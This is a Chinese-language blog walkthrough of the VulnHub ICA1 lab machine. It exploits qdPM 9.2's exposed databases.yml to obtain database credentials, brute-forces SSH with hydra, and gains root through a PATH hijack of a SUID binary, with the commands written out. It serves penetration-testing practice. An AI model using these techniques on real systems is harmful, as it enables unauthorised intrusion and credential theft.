---
title: ICA1 VulnHub Walkthrough
date: 2021-11-01 14:35:38
categories:
- 渗透测试
tags:
- VulnHhub
---

### 主机发现

```
arp-scan -l
```

![](https://i.loli.net/2021/11/01/DtOf6MJVR5ndoGe.png)

### 端口扫描

```
nmap -Pn -p- 192.168.62.182
```

![](https://i.loli.net/2021/11/01/xCtO6cIAsQMSLDi.png)

开放了22、80、3306端口

访问80端口，是一个登录界面

<img src="https://i.loli.net/2021/11/01/1ejgDTcrmNXdtRw.png" style="zoom:80%;" />

qdPM是一个开源的项目管理系统，基于[Symfony](http://www.oschina.net/p/symfony)框架+PHP/MySQL开发，可以看到qdPM的版本为9.2

### 漏洞发现

搜索一下exploit-db看看有没有公开的exp

![](https://i.loli.net/2021/11/01/yZIxHGg2QtN9LiS.png)

可以看到这个版本存在数据库敏感信息泄露，可以未授权获取数据库连接信息和密码

看一下利用方式

![](https://i.loli.net/2021/11/01/6NC3oaG9FzRYWrl.png)

### 漏洞利用

我们可以通过访问`http://<website>/core/config/databases.yml`来下载包含数据库连接信息和密码的yml文件

<img src="https://i.loli.net/2021/11/01/4WVgx7HBS19dC2P.png" style="zoom:80%;" />

通过访问`http://192.168.62.182/core/config/databases.yml`成功得到了数据库的用户名和密码`qdpmadmin:UcVQCMQk2STVeS6J`

接下来尝试登录数据库，进一步获取敏感信息

```
mysql -u qdpmadmin -h 192.168.62.182 -p
```

<img src="https://i.loli.net/2021/11/01/CGJbOxwdtpsjXzD.png" style="zoom:80%;" />

在`staff`数据库中找到了五组用户名和密码，密码是经过编码加密的

<img src="https://i.loli.net/2021/11/01/wFHBokpdDs89Aj3.png" style="zoom:80%;" />

### SSH密码爆破

将经过base64编码的密码字符串解码一下，记录到一个文本中

![](https://i.loli.net/2021/11/01/QaPujeoxcKYhXGm.png)

将用户名也记录到一个文本中

![](https://i.loli.net/2021/11/01/ljuvOXPLYSUmhd5.png)

用账户密码来爆破80端口的登陆界面无果，只能尝试爆破22端口了

```
hydra -L user -P password ssh://192.168.62.182 -f
```

![](https://i.loli.net/2021/11/01/cskMQEIqhPKT2fY.png)

![](https://i.loli.net/2021/11/01/rUxToiE435wZ62q.png)

成功得到了两组ssh的用户名和密码，尝试登录ssh

先登录`travis`账号，获取到了第一个flag

![](https://i.loli.net/2021/11/01/tCaRQhxnyWjlABZ.png)

再登录`dexter`，看到有提示，应该是要利用可执行文件来提权

<img src="https://i.loli.net/2021/11/01/i5gulQ2FmUo9j6b.png" style="zoom: 80%;" />

### 权限提升

先查看一下有执行权限的文件

```
find / -perm -u=s 2>/dev/null
```

![](https://i.loli.net/2021/11/01/o3u5HCDSTckYPmG.png)

用strings查看一下`/opt/get_access`

![](https://i.loli.net/2021/11/01/BsXuYOF3ymfWdNl.png)

可以推测执行`/opt/get_access`时会进行`setuid`操作，接着会执行`cat`命令

为了证明我们的推测，我们对`get_access`进行反编译，我们通过伪代码可以比较清晰地看到，当执行`get_access`时会执行`setuid(0)`，再执行`cat`命令打印系统信息,并且执行的`cat`命令是没有指定路径的

<img src="https://i.loli.net/2021/11/01/x7yHcPQhgoUrDG2.png" style="zoom: 80%;" />

接下来我们可以通过伪造一个文件名为`cat`的可执行文件，文件内容为`/bin/bash`，并将文件路径设置为环境变量，这样执行`get_access`的时候，就会执行我们伪造的`cat`文件，从而使我们获得root权限

```
echo '/bin/bash' > /tmp/cat
chmod +x /tmp/cat 
echo $PATH
export PATH=/tmp:$PATH
/opt/get_access
```

![](https://i.loli.net/2021/11/01/z4WNPo1MdavIbrs.png)

我们已经成功得到了root权限，最后我们通过`more`命令获取第二个flag

![](https://i.loli.net/2021/11/01/yciWRaIrQzpNfk3.png)
